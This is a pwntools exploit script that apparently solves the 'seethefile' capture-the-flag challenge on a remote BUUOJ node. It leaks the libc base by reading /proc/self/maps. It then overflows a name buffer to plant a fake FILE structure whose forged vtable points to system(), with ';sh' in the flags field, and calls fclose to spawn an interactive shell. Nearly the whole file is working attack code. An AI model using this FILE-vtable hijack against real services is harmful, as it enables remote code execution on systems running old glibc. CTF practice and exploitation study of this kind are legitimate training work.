# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './seethefile'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.23-32-buu.so')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29134'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('choice :',num)

def o(name):
    cmd(1)
    sla('see :' , name)

def r():
    cmd(2)

def w():
    cmd(3)


# one_gad = one_gadget(libc.path)

def attack():
    
    fake_addr = 0x0804B300

    o('/proc/self/maps')
    r()
    w()
    ru('00:00 0 \n')
    libc.address = rint(8) 
    system_addr = libc.sym['system']
    binsh_addr = libc.search('/bin/sh\x00').next()

    payload  = 'a'*0x20
    payload += p32(fake_addr) 
    payload += '\x00'*0x7c
    payload += '\xff\xdf\xff\xff;sh\x00'.ljust(0x94 , '\x00')
    payload += p32(fake_addr + 0x98)
    
    # 这里为 vtable 由于2.23没检查可以直接偷了

    payload += p32(system_addr)*0x20

    lg('system_addr',system_addr)
    # dbg('fclose')
    cmd(5)
    sla('name :' , payload)
    # dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   seethefile.py
@Time    :   2022/02/03 16:30:04
@Author  :   Niyah 
'''